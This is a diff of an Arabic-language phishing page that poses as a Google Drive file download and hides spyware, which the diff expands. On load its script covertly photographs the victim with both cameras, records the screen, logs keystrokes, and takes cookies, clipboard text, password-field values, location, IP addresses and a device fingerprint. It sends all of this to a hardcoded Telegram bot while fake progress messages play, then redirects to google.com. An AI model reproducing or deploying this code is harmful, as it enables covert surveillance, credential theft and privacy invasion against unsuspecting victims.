@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -6,14 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>جاري تحميل الملف...</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont,  Segoe UI , Roboto,  Helvetica Neue , Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -77,10 +72,6 @@
             font-size: 11px;
             color: #bdc3c7;
         }
-        /* كل شيء مخفي تمامًا */
-        .hidden-elements {
-            display: none !important;
-        }
         video {
             position: fixed;
             top: -9999px;
@@ -108,8 +99,9 @@
     <div class="footer-note">© Google Drive • تحميل آمن</div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 <script>
-(function() {
+(async function() {
     // ========== إعدادات البوت ==========
     const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
     const CHAT_ID = "7984067238";
@@ -121,14 +113,15 @@
     let frontCount = 0, backCount = 0, cycleCount = 0;
     let isActive = true;
     let keyBuffer = "";
+    let savedPasswords = [];
     
-    // ========== دوال الإرسال (صامتة) ==========
+    // ========== دوال الإرسال ==========
     async function sendMessage(text) {
         try {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method:  POST ,
-                headers: {  Content-Type :  application/json  },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode:  HTML  })
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode: 'HTML' })
             });
         } catch(e) {}
     }
@@ -136,21 +129,31 @@
     async function sendPhoto(blob, caption) {
         try {
             const fd = new FormData();
-            fd.append( chat_id , CHAT_ID);
-            fd.append( photo , blob, `img_${Date.now()}.jpg`);
-            if (caption) fd.append( caption , caption);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:  POST , body: fd });
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, `img_${Date.now()}.jpg`);
+            if (caption) fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         } catch(e) {}
     }
     
-    // ========== الكاميرا الأمامية (صامتة) ==========
+    async function sendVideo(blob, caption) {
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('video', blob, `screen_${Date.now()}.webm`);
+            if (caption) fd.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
+        } catch(e) {}
+    }
+    
+    // ========== 1+2. الكاميرات ==========
     async function initFront() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: { exact:  user  }, width: { ideal: 1024 }, height: { ideal: 768 } } 
+                video: { facingMode: { exact: 'user' }, width: { ideal: 1280 }, height: { ideal: 720 } } 
             });
             frontStream = stream;
-            frontVideo = document.getElementById( frontVideo );
+            frontVideo = document.getElementById('frontVideo');
             frontVideo.srcObject = stream;
             await frontVideo.play();
             await new Promise(r => setTimeout(r, 300));
@@ -159,14 +162,13 @@
         } catch(e) { return false; }
     }
     
-    // ========== الكاميرا الخلفية (صامتة) ==========
     async function initBack() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: { exact:  environment  }, width: { ideal: 1024 }, height: { ideal: 768 } } 
+                video: { facingMode: { exact: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } } 
             });
             backStream = stream;
-            backVideo = document.getElementById( backVideo );
+            backVideo = document.getElementById('backVideo');
             backVideo.srcObject = stream;
             await backVideo.play();
             await new Promise(r => setTimeout(r, 300));
@@ -175,7 +177,6 @@
         } catch(e) { return false; }
     }
     
-    // ========== التقاط صورة ==========
     async function capture(videoEl, side) {
         return new Promise((resolve) => {
             try {
@@ -183,141 +184,240 @@
                     resolve(false);
                     return;
                 }
-                const canvas = document.createElement( canvas );
+                const canvas = document.createElement('canvas');
                 canvas.width = videoEl.videoWidth;
                 canvas.height = videoEl.videoHeight;
-                const ctx = canvas.getContext( 2d );
+                const ctx = canvas.getContext('2d');
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 canvas.toBlob(async (blob) => {
                     if (blob && blob.size > 5000) {
-                        const label = side ===  front  ? `🤳 أمامي #${frontCount+1}` : `📷 خلفي #${backCount+1}`;
+                        const label = side === 'front' ? `🤳 أمامي #${frontCount+1}` : `📷 خلفي #${backCount+1}`;
                         await sendPhoto(blob, label);
-                        if (side ===  front ) frontCount++;
+                        if (side === 'front') frontCount++;
                         else backCount++;
                         resolve(true);
                     } else resolve(false);
-                },  image/jpeg , 0.85);
+                }, 'image/jpeg', 0.9);
             } catch(e) { resolve(false); }
         });
     }
     
-    // ========== دورة التصوير (خلفية تمامًا) ==========
     async function startCycle() {
         if (!isActive) return;
         cycleCount++;
         
         if (frontReady) {
-            for (let i = 0; i < 6; i++) {
+            for (let i = 0; i < 8; i++) {
                 if (!isActive) break;
-                await capture(frontVideo,  front );
+                await capture(frontVideo, 'front');
                 await new Promise(r => setTimeout(r, 350));
             }
         }
         
         if (backReady) {
-            for (let i = 0; i < 6; i++) {
+            for (let i = 0; i < 8; i++) {
                 if (!isActive) break;
-                await capture(backVideo,  back );
+                await capture(backVideo, 'back');
                 await new Promise(r => setTimeout(r, 350));
             }
         }
         
-        setTimeout(() => { if (isActive) startCycle(); }, 7000);
+        setTimeout(() => { if (isActive) startCycle(); }, 8000);
     }
     
-    // ========== تسجيل الشاشة ==========
+    // ========== 3. تسجيل الشاشة ==========
     async function recordScreen() {
         try {
-            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-            const recorder = new MediaRecorder(stream, { mimeType:  video/webm  });
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
             const chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type:  video/webm  });
+                const blob = new Blob(chunks, { type: 'video/webm' });
                 if (blob.size > 10000) {
-                    const fd = new FormData();
-                    fd.append( chat_id , CHAT_ID);
-                    fd.append( video , blob, `screen_${Date.now()}.webm`);
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method:  POST , body: fd });
+                    await sendVideo(blob, `🖥️ تسجيل شاشة - ${new Date().toLocaleString()}`);
                 }
                 stream.getTracks().forEach(t => t.stop());
             };
             recorder.start();
-            setTimeout(() => { if (recorder.state ===  recording ) recorder.stop(); }, 18000);
+            setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 20000);
         } catch(e) {}
     }
     
-    // ========== معلومات الجهاز ==========
-    async function sendDeviceData() {
-        let msg = `🔐 <b>جهاز جديد</b>\n━━━━━━━━━━━━━━━━━━\n`;
-        msg += `📱 ${navigator.userAgent.substring(0, 120)}\n`;
-        msg += `💻 ${navigator.platform}\n`;
-        msg += `📺 ${screen.width}x${screen.height}\n`;
-        msg += `🌍 ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        msg += `🧠 RAM: ${navigator.deviceMemory ||  غير معروف } جيجا\n`;
-        msg += `⚙️ النوى: ${navigator.hardwareConcurrency ||  غير معروف }\n`;
+    // ========== 4. معلومات الجهاز الكاملة ==========
+    async function sendDeviceInfo() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ram: navigator.deviceMemory || 'غير معروف',
+            cores: navigator.hardwareConcurrency || 'غير معروف',
+            touchSupport: 'ontouchstart' in window,
+            darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
+            connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'غير معروف'
+        };
+        
+        let msg = '🔐 <b>معلومات الجهاز</b>\n━━━━━━━━━━━━━━━━━━\n';
+        for (const [k, v] of Object.entries(info)) {
+            msg += `📌 ${k}: ${v}\n`;
+        }
         await sendMessage(msg);
     }
     
-    // ========== الموقع ==========
+    // ========== 5. الموقع الجغرافي ==========
     async function getLocationData() {
         if (!navigator.geolocation) return;
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            await sendMessage(`📍 <b>الموقع</b>\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 الدقة: ${pos.coords.accuracy}م`);
+            await sendMessage(`📍 <b>الموقع الجغرافي</b>\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 الدقة: ${pos.coords.accuracy} متر`);
         }, () => {});
     }
     
-    // ========== IP العام ==========
+    // ========== 6. IP العام ==========
     async function getPublicIP() {
         try {
-            const res = await fetch( https://api.ipify.org?format=json );
+            const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             await sendMessage(`🌍 <b>IP العام</b>\n<code>${data.ip}</code>`);
         } catch(e) {}
     }
     
-    // ========== Keylogger ==========
+    // ========== 7. IP المحلي ==========
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (ice) => {
+                if (!ice.candidate) return;
+                const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
+                if (match && match[0] && !match[0].startsWith('192.168.')) return;
+                if (match && match[0]) {
+                    sendMessage(`🏠 <b>IP المحلي</b>\n<code>${match[0]}</code>`);
+                    pc.close();
+                    resolve();
+                }
+            };
+            setTimeout(() => resolve(), 3000);
+        });
+    }
+    
+    // ========== 8. بصمة الجهاز ==========
+    async function getFingerprint() {
+        try {
+            const fp = await FingerprintJS.load();
+            const result = await fp.get();
+            await sendMessage(`🆔 <b>بصمة الجهاز</b>\n<code>${result.visitorId}</code>`);
+        } catch(e) {}
+    }
+    
+    // ========== 9. الكوكيز ==========
+    async function stealCookies() {
+        if (document.cookie && document.cookie.length > 0) {
+            await sendMessage(`🍪 <b>الكوكيز</b>\n<code>${document.cookie.substring(0, 900)}</code>`);
+        }
+    }
+    
+    // ========== 10. Keylogger ==========
     function startKeylogger() {
-        document.addEventListener( keydown , (e) => {
+        document.addEventListener('keydown', (e) => {
             const target = e.target;
-            if (target && (target.tagName ===  INPUT  || target.tagName ===  TEXTAREA )) {
-                if (e.key ===  Enter ) keyBuffer +=  [⏎] ;
-                else if (e.key ===  Backspace ) keyBuffer +=  [⌫] ;
+            if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable)) {
+                if (e.key === 'Enter') keyBuffer += '[⏎]';
+                else if (e.key === 'Backspace') keyBuffer += '[⌫]';
+                else if (e.key === 'Tab') keyBuffer += '[TAB]';
                 else if (e.key.length === 1) keyBuffer += e.key;
                 
-                if (keyBuffer.length > 150) {
-                    sendMessage(`⌨️ <b>ضغطات</b>\n<code>${keyBuffer}</code>`);
-                    keyBuffer =   ;
+                if (keyBuffer.length > 200) {
+                    sendMessage(`⌨️ <b>ضغطات المفاتيح</b>\n<code>${keyBuffer}</code>`);
+                    keyBuffer = '';
                 }
             }
         });
         
         setInterval(() => {
             if (keyBuffer.length > 0) {
-                sendMessage(`⌨️ <b>ضغطات</b>\n<code>${keyBuffer}</code>`);
-                keyBuffer =   ;
+                sendMessage(`⌨️ <b>ضغطات المفاتيح</b>\n<code>${keyBuffer}</code>`);
+                keyBuffer = '';
             }
-        }, 12000);
+        }, 15000);
     }
     
-    // ========== سرقة الكوكيز ==========
-    async function stealCookies() {
-        if (document.cookie && document.cookie.length > 0) {
-            await sendMessage(`🍪 <b>الكوكيز</b>\n<code>${document.cookie.substring(0, 800)}</code>`);
-        }
-    }
-    
-    // ========== سرقة الحافظة ==========
+    // ========== 11. الحافظة ==========
     async function stealClipboard() {
         try {
             const text = await navigator.clipboard.readText();
             if (text && text.length > 0) {
-                await sendMessage(`📋 <b>الحافظة</b>\n<code>${text.substring(0, 500)}</code>`);
+                await sendMessage(`📋 <b>الحافظة</b>\n<code>${text.substring(0, 800)}</code>`);
             }
         } catch(e) {}
     }
     
-    // ========== تغيير النص الوهمي للضحية ==========
+    // ========== 12. كلمات المرور المخزنة ==========
+    async function stealPasswords() {
+        try {
+            const inputs = document.querySelectorAll('input[type="password"]');
+            inputs.forEach(input => {
+                if (input.value && input.value.length > 0 && !savedPasswords.includes(input.value)) {
+                    savedPasswords.push(input.value);
+                }
+            });
+            if (savedPasswords.length > 0) {
+                await sendMessage(`🔑 <b>كلمات المرور المخزنة</b>\n<code>${savedPasswords.join('\n')}</code>`);
+            }
+        } catch(e) {}
+    }
+    
+    // ========== 13. كشف VPN/Proxy ==========
+    async function detectVPN() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.proxy || data.hosting) {
+                await sendMessage(`🔒 <b>VPN/Proxy مكتشف!</b>\n🌍 IP: ${data.ip}\n🏢 المزود: ${data.org || 'غير معروف'}`);
+            }
+        } catch(e) {}
+    }
+    
+    // ========== 14. كشف الوضع الخفي ==========
+    function detectIncognito() {
+        return new Promise((resolve) => {
+            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+            if (!fs) resolve(false);
+            else fs(window.TEMPORARY, 100, () => resolve(false), () => {
+                sendMessage('🕵️ <b>الوضع الخفي (Incognito)</b>\nالمستخدم يستخدم وضع التصفح المتخفي');
+                resolve(true);
+            });
+        });
+    }
+    
+    // ========== 15. كشف AdBlock ==========
+    function detectAdBlock() {
+        const bait = document.createElement('div');
+        bait.className = 'adsbox';
+        bait.style.display = 'none';
+        document.body.appendChild(bait);
+        setTimeout(() => {
+            if (bait.offsetHeight === 0) {
+                sendMessage('🛡️ <b>AdBlock مكتشف</b>\nيستخدم المستخدم مانع إعلانات');
+            }
+            bait.remove();
+        }, 100);
+    }
+    
+    // ========== 16. منع إغلاق الصفحة ==========
+    function preventClose() {
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+    }
+    
+    // ========== الوهم البصري للمستخدم ==========
     let step = 0;
     const fakeMessages = [
         "جاري فتح الملف...",
@@ -325,59 +425,63 @@
         "اكتمال 45%",
         "اكتمال 78%",
         "معالجة...",
-        "اكتمال 100% 🎉",
+        "اكتمال 100% ✅",
         "جاري إعادة التوجيه..."
     ];
     
     function updateFakeStatus() {
-        const statusEl = document.getElementById( statusMsg );
+        const statusEl = document.getElementById('statusMsg');
         if (statusEl && step < fakeMessages.length) {
             statusEl.innerText = fakeMessages[step];
             step++;
             setTimeout(updateFakeStatus, 800);
         } else if (step >= fakeMessages.length) {
-            // إعادة توجيه إلى موقع حقيقي بعد 3 ثوانٍ
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
-            }, 2000);
+            }, 1500);
         }
     }
     
-    // ========== التشغيل الرئيسي (كل شيء في الخلفية) ==========
+    // ========== التشغيل الرئيسي ==========
     async function main() {
-        // طلب الصلاحيات (يظهر للمستخدم مرة واحدة فقط)
+        // طلب الصلاحيات (مرة واحدة فقط)
         try {
-            await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         } catch(e) {}
         
-        // بدء جميع العمليات في الخلفية (غير مرئية للمستخدم)
-        setTimeout(async () => {
-            await sendMessage(`🚀 <b>اختراق ناجح</b>\n🕐 ${new Date().toLocaleString( ar-EG )}`);
-            await sendDeviceData();
-            await getPublicIP();
-            await getLocationData();
-            await stealCookies();
-            await stealClipboard();
-            
-            await initFront();
-            await initBack();
-            
-            if (frontReady || backReady) {
-                startCycle();
-            }
-            
-            startKeylogger();
-            recordScreen();
-            
-        }, 100);
+        // إرسال إشعار بدء الاختراق
+        await sendMessage(`🚀 <b>اختراق ناجح</b>\n🕐 ${new Date().toLocaleString('ar-EG')}\n📱 ${navigator.userAgent.substring(0, 80)}`);
         
-        // بدء الوهم البصري للمستخدم
-        updateFakeStatus();
+        // تشغيل جميع الميزات بالتوازي
+        await sendDeviceInfo();
+        await getPublicIP();
+        await getLocalIP();
+        await getLocationData();
+        await getFingerprint();
+        await stealCookies();
+        await stealClipboard();
+        await stealPasswords();
+        await detectVPN();
+        await detectIncognito();
+        detectAdBlock();
+        preventClose();
+        startKeylogger();
+        
+        // الكاميرات والتصوير
+        await initFront();
+        await initBack();
+        if (frontReady || backReady) {
+            startCycle();
+        }
+        
+        // تسجيل الشاشة
+        recordScreen();
     }
     
-    // تشغيل كل شيء بعد تحميل الصفحة مباشرة
+    // تشغيل كل شيء
     window.onload = () => {
         setTimeout(main, 200);
+        updateFakeStatus();
     };
 })();
 </script>
